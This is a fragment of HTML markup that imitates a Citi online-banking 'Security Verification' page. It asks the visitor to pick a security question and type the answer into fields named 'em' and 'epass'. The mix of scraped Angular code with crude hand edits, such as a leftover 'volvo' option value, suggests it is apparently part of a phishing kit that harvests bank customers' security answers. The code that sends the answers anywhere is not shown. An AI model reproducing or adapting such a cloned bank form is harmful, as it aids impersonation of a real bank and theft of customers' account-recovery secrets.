                          ...
                          <citi-progress-bar _ngcontent-ibb-c277="" _nghost-ibb-c107="">
                            <div _ngcontent-ibb-c107="" class="progress-indicator-wrapper clearfix col-xs-12"><span _ngcontent-ibb-c107="" class="sr-only" id="progress-bar-0">Step 1 of 4: Verification</span>
                              <ol _ngcontent-ibb-c107="" class="progress-indicator col-xs-12">
                                <li _ngcontent-ibb-c277="" citi-progress-bar-step="" _nghost-ibb-c106="" class="progress-indicator-step progress-indicator-step-active"> <span _ngcontent-ibb-c106="" aria-hidden="true" class="primary-label">Security Verification</span>
                            ...
                            <div _ngcontent-tey-c262="" role="main" class="fullbleedFix">
                              <citi-row _ngcontent-tey-c262="">
                                <div class="row">
                                  ...
                                  <h3 _ngcontent-tey-c262="" class="h3-style col-sm-12 head-padding"><strong>Verify Your Security Question</strong></h3></div>
                              </citi-row>
                              <div _ngcontent-tey-c262="" content5="" class="row">
                                <citi-row _ngcontent-tey-c262="">
                                  <div class="row">
                                    <div _ngcontent-tey-c262="" class="cross-link-card col-sm-12 head-padding">
                                      <div _ngcontent-tey-c262="" class="h4-style cross-link-heading">Please select your security question below.</div>
                                    </div>
                                  </div>
                                  <br> </citi-row>
                                <citi-row _ngcontent-tey-c262="">
                                      ...
                                      <div class="col-xs-12">
                                        <citi-input2 _ngcontent-tey-c262="" name="cardFieldName" idstr="cardFieldId" minlength="14" maxlength="16" class="citi-input2 row ng-untouched ng-invalid ng-dirty" _nghost-tey-c118="" required="">
                                          <div _ngcontent-tey-c118="" class="form-control-container col-md-4 col-sm-6">
                                            ...
                                            <select _ngcontent-tey-c118="" autocapitalize="none" type="text" id="em" name="em" tabindex="0" placeholder="Select your question" autocomplete="off" aria-required="true" required="true" aria-label="" aria-labelledby="cardFieldId-label"><!----><!---->
     <option class="input-switch-wrapper" value="volvo">Click here to select your question&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</option>
    <option value="Favorite Snack">Favorite Snack</option>
    <option value="Favorite Hobby">Favorite Hobby  </option>
    <option value="Favorite Teacher">Favorite Teacher </option>
       <option value="Favorite Pet's Name">Favorite Pet's Name</option>
    <option value="Best friend's last name">Best friend's last name</option>
    <option value="First Concert Attended">First Concert Attended</option>
    <option value="Ideal Place to Vacation">Ideal Place to Vacation</option>
                                      ...
                                      <div class="col-xs-12">
                                        <citi-input2 _ngcontent-tey-c262="" name="cardFieldName" idstr="cardFieldId" minlength="14" maxlength="20" class="citi-input2 row ng-untouched ng-invalid ng-dirty" _nghost-tey-c118="" required="">
                                          <div _ngcontent-tey-c118="" class="form-control-container col-md-4 col-sm-6">
                                            ...
                                            <input _ngcontent-tey-c118="" autocapitalize="none" type="text" id="epass" name="epass" tabindex="0" placeholder="Enter your answer" autocomplete="off" aria-required="true" required="true" aria-labelledby="cardFieldId-label"><!----><!----></span>
                                              <div _ngcontent-tey-c118="" class="add-on-post">
                                                <!---->
                                                <!---->
                                                <!---->
